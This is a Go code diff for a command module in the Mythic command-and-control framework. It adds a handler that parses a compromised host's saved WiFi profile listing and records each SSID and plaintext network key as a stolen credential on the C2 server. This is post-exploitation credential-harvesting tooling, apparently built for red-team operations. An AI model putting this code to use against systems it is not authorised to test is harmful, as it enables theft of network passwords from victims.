@@ -2,8 +2,10 @@ package agentfunctions
 
 import (
 	"fmt"
+	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
 
 func init() {
@@ -42,6 +44,46 @@ func init() {
 		},
 		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
 			return args.LoadArgsFromDictionary(input)
+		},
+		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
+			response := agentstructs.PTTaskProcessResponseMessageResponse{
+				TaskID:  processResponse.TaskData.Task.ID,
+				Success: true,
+			}
+			responseText, ok := processResponse.Response.(string)
+			if !ok || responseText == "" {
+				return response
+			}
+			// Parse WiFi profiles table: "SSID          Auth       Cipher   Key                     Source"
+			hostname := processResponse.TaskData.Callback.Host
+			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
+			for _, line := range strings.Split(responseText, "\n") {
+				line = strings.TrimSpace(line)
+				// Skip headers, separators, and summary lines
+				if line == "" || strings.HasPrefix(line, "[*]") || strings.HasPrefix(line, "---") ||
+					strings.HasPrefix(line, "SSID") {
+					continue
+				}
+				// Table columns are space-aligned; extract SSID and key
+				fields := strings.Fields(line)
+				if len(fields) < 4 {
+					continue
+				}
+				ssid := fields[0]
+				key := fields[3]
+				if key == "(none/open)" || key == "" {
+					continue
+				}
+				creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+					CredentialType: "password",
+					Realm:          fmt.Sprintf("WiFi (%s)", hostname),
+					Account:        ssid,
+					Credential:     key,
+					Comment:        "wlanprofiles",
+				})
+			}
+			registerCredentials(processResponse.TaskData.Task.ID, creds)
+			return response
 		},
 		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
 			response := agentstructs.PTTaskCreateTaskingMessageResponse{
